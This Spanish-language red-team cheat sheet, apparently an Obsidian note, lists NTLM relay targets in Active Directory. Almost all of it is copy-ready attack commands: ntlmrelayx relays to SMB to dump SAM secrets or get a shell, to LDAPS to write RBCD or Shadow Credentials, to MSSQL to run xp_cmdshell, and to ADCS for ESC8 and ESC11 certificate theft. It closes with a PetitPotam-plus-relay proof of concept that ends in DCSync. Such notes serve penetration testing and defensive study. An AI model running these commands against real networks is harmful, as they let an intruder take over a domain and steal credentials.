---
aliases:
  - NTLM Relay Targets
tags:
  - technique/lateral-movement
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: SubCheatSheet
linked:
  - "[[NTLM Relay]]"
  - "[[AD CS Abuse]]"
  - "[[Resource-Based Constrained Delegation (RBCD)]]"
---
# NTLM Relay - Relay Targets

> A dónde relayás la auth capturada determina el impacto. Cada target tiene su precondición (signing off, EPA off, etc.).

---

## Relay → SMB

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `nxc smb 10.10.10.0/24 --gen-relay-list targets.txt` | Lista de hosts sin SMB signing | Pre-relay (targets válidos). |
| `sudo ntlmrelayx.py -tf targets.txt -smb2support` | Dump SAM/secrets si el victim es local admin | Relay SMB básico. |
| `ntlmrelayx.py -tf targets.txt -smb2support -i` | Shell interactivo (`nc 127.0.0.1 11000`) | Acceso interactivo. |
| `ntlmrelayx.py -tf targets.txt -smb2support -socks` | SOCKS proxy → `proxychains nxc smb ...` | Pivot multi-host. |
^ntlmrelay-smb

## Relay → LDAP(S) — RBCD / Shadow Credentials

> Si el victim es **computer account**, relay a LDAPS para escribir RBCD o Shadow Credentials sobre un target.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `impacket-addcomputer corp.local/user:pass -computer-name 'ATTACKER$' -computer-pass 'P@ss123' -dc-host $DC` | Computer account de ataque (si MAQ>0) | Pre-RBCD. |
| `sudo ntlmrelayx.py -t ldaps://$DC --delegate-access --escalate-user 'ATTACKER$'` | Escribe `msDS-AllowedToActOnBehalfOf` → RBCD | Relay de computer account → [[Resource-Based Constrained Delegation (RBCD)]]. |
| `impacket-getST -spn cifs/$TARGET -impersonate administrator -dc-ip $IP 'corp.local/ATTACKER$:P@ss123'` | TGS como administrator hacia el target | Tras escribir RBCD. |
| `sudo ntlmrelayx.py -t ldaps://$DC --shadow-credentials --shadow-target 'TARGET$'` | Shadow Credentials sobre el target (cert) | Preferible si hay ADCS. |
^ntlmrelay-ldap

## Relay → MSSQL / HTTP / WinRM

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `ntlmrelayx.py -t mssql://10.10.10.5 -q "exec xp_cmdshell 'whoami'"` | RCE en el SQL server | Victim con acceso al MSSQL. |
| `sudo ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController` | Cert del DC (ESC8) → hash de `DC$` | Web enrollment sin EPA → [[AD CS Abuse]]. |
| `ntlmrelayx.py -t rpc://$CA -rpc-mode ICPR -icpr-ca-name $CA -smb2support` | Cert vía RPC (ESC11) | RPC sin encryption. |
| `ntlmrelayx.py -t http://host:5985/wsman -smb2support` | Shell vía WinRM | WinRM HTTP expuesto. |
^ntlmrelay-other

### PoC ESC8 (relay → cert de DA)

```bash
# Terminal 1
ntlmrelayx.py -t http://CA-HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Terminal 2
PetitPotam.py -u '' -p '' 10.10.10.50 dc01.corp.local
# → dc.pfx → certipy auth → hash de DC$ → DCSync
```
